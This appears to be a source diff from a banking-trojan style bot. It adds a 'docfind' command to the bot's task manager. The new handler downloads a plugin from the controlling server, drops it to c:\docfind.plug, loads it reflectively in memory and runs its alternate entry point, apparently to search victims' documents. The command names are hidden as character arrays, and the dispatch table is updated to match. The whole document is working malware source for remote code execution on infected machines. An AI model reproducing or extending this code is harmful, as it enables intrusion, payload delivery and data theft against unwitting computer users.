@@ -742,6 +742,44 @@ bool ExecuteLoadDLLDisk(PTaskManager, PCHAR Command, PCHAR Args)
 	return res;
 }
 
+bool ExecuteDocFind(PTaskManager, PCHAR Command, PCHAR Args)
+{
+	typedef BOOL (WINAPI *typeBuildStubDllMain)(HANDLE DllHandle, DWORD Reason, LPVOID );
+	BYTE* data = 0;
+	DWORD size = 0;
+	data = Plugin::Download( "docfind.plug", 0, &size, false );
+	bool res = false;
+	if( data )
+	{
+		TASKDBG( "----", "0" );
+		File::WriteBufferA( "c:\\docfind.plug", data, size );
+		HMEMORYMODULE module = MemoryLoadLibrary(data);
+		TASKDBG( "----", "01" );
+		if( module )
+		{
+			TASKDBG( "----", "1" );
+			DWORD* gAltEPOffs = (DWORD*) MemoryGetProcAddress( module, "gAltEPOffs" );
+			if( gAltEPOffs )
+			{
+				TASKDBG( "----", "2" );
+				typeBuildStubDllMain func = (typeBuildStubDllMain)gAltEPOffs[0];
+				if( func )
+				{
+					TASKDBG( "----", "3" );
+					HANDLE hEvent = pCreateEventA( NULL, FALSE, FALSE, "Global\\_SearchComplete32" );
+					func( 0, DLL_PROCESS_ATTACH, 0 );
+					DWORD dwWait = (DWORD)pWaitForSingleObject( hEvent, INFINITE );
+					pCloseHandle(hEvent);
+					TASKDBG( "----", "4" );
+				}
+			}
+			MemoryFreeLibrary(module);
+		}
+		MemFree(data);
+	}
+	return res;
+}
+
 bool ExecuteMultiDownload(PTaskManager Manager, PCHAR Command, PCHAR Args)
 {
 	// Запустить множественную загрузку файлов
@@ -819,15 +857,18 @@ TCommandMethod GetCommandMethod(PTASKMANAGER Manager, PCHAR  Command)
 	const static char CommandAlert[]         = {'a', 'l', 'e', 'r', 't', 0};
 	const static char CommandUpdateHosts[]   = {'u', 'p', 'd', 'a', 't', 'e', 'h', 'o', 's', 't', 's',  0};
 	const static char CommandLoadDLLDisk[]	 = {'l','o','a','d','d','l','l','d','i','s','k', 0};
+	const static char CommandDocFind[]		 = {'d','o','c','f','i','n','d', 0};
 
-	int Index = StrIndexOf( Command, false, 7,
+	int Index = StrIndexOf( Command, false, 8,
 							(PCHAR)CommandUpdate,
 							(PCHAR)CommandUpdateConfig,
 							(PCHAR)CommandDownload,
 							(PCHAR)CommandLoadDll,
 							(PCHAR)CommandAlert,
 							(PCHAR)CommandUpdateHosts,
-							(PCHAR)CommandLoadDLLDisk);
+							(PCHAR)CommandLoadDLLDisk,
+							(PCHAR)CommandDocFind
+						  );
 
 
 	switch (Index)
@@ -839,6 +880,7 @@ TCommandMethod GetCommandMethod(PTASKMANAGER Manager, PCHAR  Command)
 		case 4: return ExecuteAlert;
 		case 5: return Hosts::ExecuteUpdateHostsCommand;
 		case 6: return ExecuteLoadDLLDisk;
+		case 7: return ExecuteDocFind;
 
     default: ;
 	}
@@ -932,4 +974,3 @@ void RegisterAllCommands(PTaskManager Manager, DWORD Commands)
 		RegisterCommand(Manager, (PCHAR)DeletePath, ExecuteDeletePathCommand);
 	#endif
 }
-
